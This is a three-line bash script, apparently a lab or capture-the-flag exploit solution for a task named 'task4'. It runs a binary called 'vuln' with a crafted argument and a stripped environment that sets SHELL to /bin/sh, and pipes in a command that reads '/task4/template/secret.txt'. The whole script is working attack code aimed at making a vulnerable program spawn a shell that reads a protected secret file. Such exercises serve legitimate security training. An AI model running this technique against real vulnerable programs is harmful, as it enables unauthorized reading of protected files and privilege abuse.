#!/usr/bin/env bash
echo /bin/cat /task4/template/secret.txt | env -i SHELL=/bin/sh \
  /task4/template/vuln "$(printf 'No, it doesn\x27t.')" 0
